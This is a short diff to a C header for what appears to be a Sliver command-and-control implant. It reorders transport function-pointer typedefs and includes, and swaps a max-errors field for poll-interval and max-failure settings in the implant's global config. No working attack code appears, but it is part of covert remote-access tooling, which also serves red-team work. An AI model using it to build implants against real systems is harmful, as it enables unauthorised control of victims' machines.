@@ -11,21 +11,6 @@ typedef struct _SLIVER_BEACON_CLIENT SLIVER_BEACON_CLIENT, * PSLIVER_BEACON_CLIE
 typedef struct _SLIVER_SESSION_CLIENT SLIVER_SESSION_CLIENT, * PSLIVER_SESSION_CLIENT;
 typedef struct _GLOBAL_CONFIG GLOBAL_CONFIG, * PGLOBAL_CONFIG;
 
-typedef LPVOID(WINAPI* CLIENT_INIT)();
-typedef BOOL(WINAPI* CLIENT_START)(LPVOID);
-typedef BOOL(WINAPI* CLIENT_SEND)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
-typedef PENVELOPE(WINAPI* CLIENT_RECV)(PGLOBAL_CONFIG, LPVOID);
-typedef BOOL(WINAPI* CLIENT_CLOSE)(LPVOID);
-typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
-
-#include "Handler.h"
-#include "Beacon.h"
-#include "Http.h"
-#include "Drive.h"
-#include "Proxy.h"
-#include "Uri.h"
-#include "Session.h"
-
 struct _GLOBAL_CONFIG {
 	CHAR szSessionID[33];
 	CHAR szSliverName[33];
@@ -37,7 +22,8 @@ struct _GLOBAL_CONFIG {
 	UINT64 uPeerID;
 	UINT64 uEncoderNonce;
 	LPSTR lpServerMinisignPublicKey;
-	DWORD dwMaxErrors;
+	DWORD dwPollInterval;
+	DWORD dwMaxFailure;
 };
 
 typedef struct _SLIVER_RESP {
@@ -50,7 +36,22 @@ typedef struct _SLIVER_RESP {
 typedef struct _SLIVER_THREADPOOL {
 	PTP_POOL pPool;
 	TP_CALLBACK_ENVIRON CallBackEnviron;
-} SLIVER_THREADPOOL, *PSLIVER_THREADPOOL;
+} SLIVER_THREADPOOL, * PSLIVER_THREADPOOL;
+
+typedef LPVOID(WINAPI* CLIENT_INIT)();
+typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
+typedef BOOL(WINAPI* CLIENT_SEND)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
+typedef PENVELOPE(WINAPI* CLIENT_RECV)(PGLOBAL_CONFIG, LPVOID);
+typedef BOOL(WINAPI* CLIENT_CLOSE)(LPVOID);
+typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
+
+#include "Handler.h"
+#include "Beacon.h"
+#include "Http.h"
+#include "Drive.h"
+#include "Proxy.h"
+#include "Uri.h"
+#include "Session.h"
 
 PBYTE RegisterSliver
 (
